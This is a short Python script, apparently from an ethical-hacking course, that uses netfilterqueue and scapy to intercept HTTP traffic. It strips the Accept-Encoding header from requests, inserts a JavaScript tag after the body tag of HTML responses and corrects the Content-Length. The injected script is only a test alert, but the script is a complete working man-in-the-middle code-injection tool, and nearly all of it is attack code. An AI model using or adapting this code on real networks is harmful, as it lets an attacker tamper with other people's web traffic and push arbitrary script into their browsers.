import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()  # Converting it to string to make it work with python 3
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+]Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+]Response")
                injection_code = "<script>alert('Test')</script>"
                load = load.replace("<body>",
                                    "<body>" + injection_code)  # replacing body tag with body and script tag to inject javascript code.
                content_length_search = re.search("(?:Content-Length:\s)(\d*)",
                                                  load)  # Using capturing and non capturing Regex and grouping them to only get the content length
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
